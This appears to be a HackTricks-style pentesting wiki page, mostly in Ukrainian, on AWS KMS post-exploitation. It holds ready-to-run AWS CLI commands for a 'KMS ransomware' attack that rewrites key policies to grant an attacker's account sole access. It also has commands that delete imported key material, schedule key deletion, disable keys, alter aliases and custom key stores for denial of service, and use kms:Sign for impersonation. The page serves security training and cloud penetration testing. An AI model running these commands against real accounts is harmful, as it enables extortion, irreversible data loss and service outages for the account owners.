# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Для отримання додаткової інформації див.:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Шифрування/Розшифрування інформації

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` зчитує файл у двійковому режимі, зазвичай використовується для бінарних (не текстових) файлів.
- `file://:` зчитує файл у текстовому режимі, зазвичай використовується для простих текстових файлів, скриптів або JSON без спеціальних вимог кодування.

> [!TIP]
> Зверніть увагу, що якщо ви хочете розшифрувати дані, що знаходяться у файлі, файл має містити двійкові дані, а не base64-кодовані дані. (fileb://)

- Використання **симетричного** ключа
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Використання **асиметричного** ключа:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Атакуючий із привілеями доступу до KMS може змінити KMS policy ключів і **grant his account access over them**, видаливши доступ, наданий легітимному обліковому запису.

Тоді користувачі легітимного облікового запису не зможуть отримати доступ до жодної інформації жодного сервісу, яка була зашифрована цими ключами, створюючи простий, але ефективний ransomware проти облікового запису.

> [!WARNING]
> Зверніть увагу, що **AWS managed keys aren't affected** цим нападом, уразливі лише **Customer managed keys**.

> [!WARNING]
> Також зауважте необхідність використовувати параметр **`--bypass-policy-lockout-safety-check`** (відсутність цієї опції у веб-консолі робить цю атаку можливою лише з CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Зверніть увагу, якщо ви зміните ту політику й надасте доступ лише зовнішньому акаунту, а потім з цього зовнішнього акаунту спробуєте встановити нову політику, щоб **повернути доступ до початкового акаунту, у вас не вийде, бо дія Put Polocy не може бути виконана з крос-акаунта**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Існує ще один спосіб реалізації глобального KMS Ransomware, що включає такі кроки:

- Створити новий **key with a key material**, імпортований зловмисником
- **Re-encrypt older data** жертви, зашифровані попередньою версією, новою версією
- **Delete the KMS key**
- Тепер лише зловмисник, який має оригінальний ключовий матеріал, зможе розшифрувати дані

### Delete Keys via kms:DeleteImportedKeyMaterial

З дозволом `kms:DeleteImportedKeyMaterial` суб'єкт може видалити імпортований ключовий матеріал з CMKs із `Origin=EXTERNAL` (CMKs, що імпортували свій ключовий матеріал), роблячи їх нездатними розшифрувати дані. Ця дія є руйнівною та незворотною, якщо не буде реімпортовано сумісного матеріалу, що дозволяє зловмиснику фактично спричинити втрату даних, схожу на ransomware, зробивши зашифровану інформацію назавжди недоступною.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Знищення keys

Знищення keys може призвести до DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Зауважте, що AWS тепер **перешкоджає виконанню попередніх дій з іншого облікового запису:**

### Change or delete Alias
Ця атака видаляє або перенаправляє AWS KMS aliases, порушуючи key resolution і спричиняючи негайні збої в будь-яких сервісах, які покладаються на ці aliases, що призводить до denial-of-service. Маючи дозволи типу `kms:DeleteAlias` або `kms:UpdateAlias`, зловмисник може видалити або перенаправити aliases і порушити криптографічні операції (наприклад, encrypt, describe). Будь-який сервіс, що посилається на alias замість key ID, може не працювати доти, поки alias не буде відновлено або правильно перенаправлено.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Скасування видалення ключа
Маючи дозволи на зразок `kms:CancelKeyDeletion` та `kms:EnableKey`, зловмисник може скасувати заплановане видалення AWS KMS customer master key та згодом знову його активувати. Це відновлює ключ (спочатку в стані Disabled) і повертає його здатність розшифровувати раніше захищені дані, що дозволяє exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Disable Key
З дозволом `kms:DisableKey` зловмисник може відключити AWS KMS customer master key, що перешкоджає його використанню для шифрування або розшифрування. Це порушує доступ для будь-яких сервісів, які залежать від цього CMK, і може спричинити негайні перебої або denial-of-service, поки ключ не буде повторно увімкнено.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Отримання спільного секрету
Маючи дозвіл `kms:DeriveSharedSecret`, суб'єкт може використати приватний ключ, що зберігається в KMS, разом із публічним ключем, наданим користувачем, щоб обчислити ECDH спільний секрет.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
З дозволом `kms:Sign` зловмисник може використовувати KMS-stored CMK для криптографічного підписування даних без розкриття приватного ключа, створюючи дійсні підписи, які можуть дозволити impersonation або авторизувати шкідливі дії.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS з Custom Key Stores
Маючи дозволи на кшталт `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` або `kms:UpdateCustomKeyStore`, зловмисник може змінити, відключити або видалити AWS KMS Custom Key Store (CKS), зробивши його master keys нефункціональними. Це порушує операції шифрування, дешифрування та підписування для будь-яких сервісів, що покладаються на ці ключі, і може спричинити негайний denial-of-service. Тому обмеження та моніторинг цих дозволів є критично важливими.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
